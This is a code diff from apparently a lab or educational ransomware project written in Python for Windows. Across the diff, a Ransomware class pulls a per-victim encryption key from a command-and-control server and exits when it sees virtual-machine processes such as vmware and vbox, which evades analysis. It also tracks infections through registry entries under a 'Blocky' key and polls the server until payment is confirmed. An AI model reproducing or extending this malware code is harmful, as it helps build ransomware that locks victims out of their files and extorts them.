@@ -11,7 +11,6 @@ import os, sys  # Handling system related tasks (hostname/usernames)
 import ctypes  # Calling Windows APIs
 import winreg  # Editing Windows Registry
 from subprocess import check_output  # Reading processes on system
-from random import randint  # Random ints for 😴
 from time import sleep  # 😴
 
 # Variables
@@ -21,7 +20,7 @@ c2_url = "http://localhost:5000"
 target_paths = [".\\toencrypt", ".\\toencrypt2"]
 # ..except for the filetypes defined in the following list
 exclude_types = (".exe", ".dll", ".img")
-# If any of these processes is running on the host, BadThread will not run.
+# If any of these processes is running on the host, Ransomware will not run.
 program_blacklist = [
     "vmware",
     "vbox",
@@ -34,7 +33,7 @@ program_blacklist = [
 
 
 class Ransomware:
-    """This object implements the core function and variables for the Ransomware"""
+    """This object initializes the ransomware stage"""
 
     def __init__(self, resume=False):
         # Data which will be received by C2 server later on
@@ -42,6 +41,15 @@ class Ransomware:
         self.encryption_key = None
         # Our "safe" used to encrypt/decrypt data
         self.box = None
+
+    def initial_check(self):
+        """Checks for existing Registry entries -> Has the Loader been successfully initialized?"""
+        if self.check_registry_entry("RansomwareDone") == "True":
+            sys.exit()
+        if self.check_registry_entry("ID") is not None:
+            self.victim_id = self.check_registry_entry("ID")
+        else:
+            sys.exit()
 
     def is_admin(self):
         """Checks if the tool has been run with Admin privileges. Otherwise print error"""
@@ -62,21 +70,13 @@ class Ransomware:
             process.lower().split(",")[0][1:-5] for process in tasks_formatted
         ]
         for x in program_blacklist:
-            # As soon as 1 blacklisted program is detected, return True -> Main will not execute BadThread
+            # As soon as 1 blacklisted program is detected, return True -> Malware will not be executed
             if x in tasks_listed:
                 return True
         return False
 
-    def initial_check(self):
-        """Checks for existing Registry entries -> Has the Loader been successfully initialized?"""
-        if self.check_registry_entry("RansomwareDone") == "True":
-            sys.exit()
-        if self.check_registry_entry("ID") is not None:
-            self.victim_id = self.check_registry_entry("ID")
-        else:
-            sys.exit()
-
     def get_encryption_key(self):
+        """Gets the encryption key from the C2 server"""
         try:
             response = httpx.get(f"{c2_url}/ransom/{self.victim_id}")
             self.encryption_key = response.headers["victim-key"]
@@ -84,6 +84,31 @@ class Ransomware:
             self.box = nacl.secret.SecretBox(bin_key)
         except httpx.RequestError as err:
             print("create_remote_entry(): Request Exception --> ", err)
+            return False
+
+    def create_registry_entry(self, subkey, subkeyvalue):
+        """Creates a Registry entry with the given subkey and subkeyvalue"""
+        keyName = r"Software\Blocky\Main"
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
+            )
+        except:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyName)
+        winreg.SetValueEx(key, subkey, 0, winreg.REG_SZ, subkeyvalue)
+        winreg.CloseKey(key)
+
+    def check_registry_entry(self, subkey):
+        """Checks for existing Registry entries -> Has the malware been here before?"""
+        keyName = r"Software\Blocky\Main"
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
+            )
+            return winreg.QueryValueEx(key, subkey)[0]
+        except:
+            # Else exit the program
+            return None
 
     def encrypt_file(self, filepath):
         """Takes a file path input and encrypts it using the box object of the Ransomware object"""
@@ -194,36 +219,12 @@ class Ransomware:
         bin_key = base64.b64decode(self.encryption_key)
         self.box = nacl.secret.SecretBox(bin_key)
 
-    def create_registry_entry(self, subkey, subkeyvalue):
-        keyName = r"Software\Blocky\Main"
-        try:
-            key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
-            )
-        except:
-            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyName)
-        winreg.SetValueEx(key, subkey, 0, winreg.REG_SZ, subkeyvalue)
-        winreg.CloseKey(key)
-
-    def check_registry_entry(self, subkey):
-        """Checks for existing Registry entries -> Has the Loader been successfully initialized?"""
-        keyName = r"Software\Blocky\Main"
-        try:
-            # If key exists, create a Loader object without getting the already known system info, and start loop again
-            key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
-            )
-            return winreg.QueryValueEx(key, subkey)[0]
-        except:
-            # Else exit the program
-            return None
-
     def sync_loop(self):
         while (
             httpx.post(f"{c2_url}/check/{self.victim_id}").headers["Payment-Received"]
             == "False"
         ):
-            sleep(5)
+            sleep(10)
 
         self.setup_decryption()
         self.start_decryption()
